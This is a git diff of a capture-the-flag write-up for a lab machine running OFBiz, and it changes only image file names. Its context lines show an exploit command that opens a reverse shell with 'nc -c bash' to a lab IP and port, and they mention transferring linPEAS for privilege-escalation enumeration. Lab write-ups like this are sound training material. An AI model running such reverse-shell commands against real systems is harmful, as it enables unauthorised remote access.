@@ -115,7 +115,7 @@ python3 exploit.py --url https://bizness.htb/ --cmd 'nc -c bash 10.10.14.19 7777
 
 From there, we just need to grab the user flag in the "_ofbiz_" home directory:
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption><p>User flag</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption><p>User flag</p></figcaption></figure>
 
 Now, before we do anything else, let's get a full TTY Shell. The best way to do this is using this Python script:
 
@@ -153,7 +153,7 @@ We can start by doing some basic enumeration. After that, if we aren't able to f
 </strong><strong>./linpeas.sh
 </strong></code></pre>
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption><p>Transfering linPEAS to the target machine</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption><p>Transfering linPEAS to the target machine</p></figcaption></figure>
 
 LinPEAS shows us that there's an executable our user has write access to:
 
